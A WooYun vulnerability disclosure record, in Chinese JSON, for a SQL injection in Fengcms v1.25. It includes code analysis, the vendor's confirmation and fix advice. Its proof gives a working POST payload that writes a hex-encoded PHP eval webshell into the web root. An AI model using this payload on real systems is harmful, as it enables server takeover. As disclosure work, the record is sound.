{"id": 52159, "wybug_id": "wooyun-2014-072135", "wybug_title": "Fengcms v1.25 SQL注入漏洞2", "wybug_corp": "fengcms.com", "wybug_author": "zxx", "wybug_date": "2014-08-13 11:57", "wybug_open_date": "2014-11-11 11:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-11：\t细节向公众公开  简要描述： 过滤问题导致sql注入 详细说明：  app/controller/searchControl.php\npublic function index(){\tif($_POST['project']){\t\tif(!$this->project_exist($_POST['project'])){//POST的project直接被放入函数\t\t\techo '<script type=\"text/javascript\">alert(\"参数错误！\");history.go(-1)</script>';\t\t}\t}。。。\n跟进project_exist函数\npublic function project_exist($string){\tif(D(\"module\")->where('project=\"'.$string.'\" and status=1')->getcount()>0){ //直接把参数带入执行了。\t\treturn $string;\t}else{\t\treturn false;\t}}\nsystem/common/filter.php但是system/app.php中有个全局的过滤:\n/*------------------ 过滤 ------------------*///php 批量过滤post,get敏感数据 if (get_magic_quotes_gpc()) { \t$_GET\t= stripslashes_array($_GET); \t$_POST\t= stripslashes_array(removexss_array($_POST)); }\n没有开启魔术引号时候可以直接注入，但是因为fengcms的报错机制，不现实报错出的内容，这里又没回显，只能盲注了。如果开启魔术引号，测试发现，我们的逗号会被过滤掉，这下不够顺畅了，跟下removexss_array函数：\nfunction removexss_array($array){\tif(!is_array($array)) return false;\tforeach($array as $k => $v){\t\t$arr[$k]= RemoveXSS($v);//跟进RemoveXSS\t}\treturn $arr;}\tfunction RemoveXSS($val) {    \t   $val = preg_replace('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/', '', $val);//其实都是他的错，细心的观众会发现，这里是过滤各种看不见的字符的，我们的逗号去哪了？！仔细看一眼，逗我呢，哪里有用逗号连接我们的正则字符范围呢，逗号在这里是被误伤的。\t 后面代码省略。。\n好了，没有逗号了，但是这里其他的符号并没有过滤，不需要逗号的sql注入代码一样可以利用，比如高权限直接写webshell到web目录。   漏洞证明：  没有魔术引号时，直接注入：\n\n开启魔术引号，来个写文件吧：http://localhost/?controller=searchPOST数据：project=1\" union select 0x3c3f70687020406576616c28245f504f53545b2770617373275d293b3f3e into outfile 'D:/dedeampz/DedeAMPZ/WebRoot/Default/test.php' %23\n\n连接一下：\n\n我感觉应该有不使用逗号的其他利用方法。   修复方案：  对project参数过滤一下把；全局过滤也有问题，尤其针对get型的，直接去掉转义，等于没过滤，post型的仅仅针对xss过滤了；另外那个正则的误伤也改下吧。   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-13 12:12 厂商回复： 非常感谢大家对FengCMS的指正！我们一定努力做到更好！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}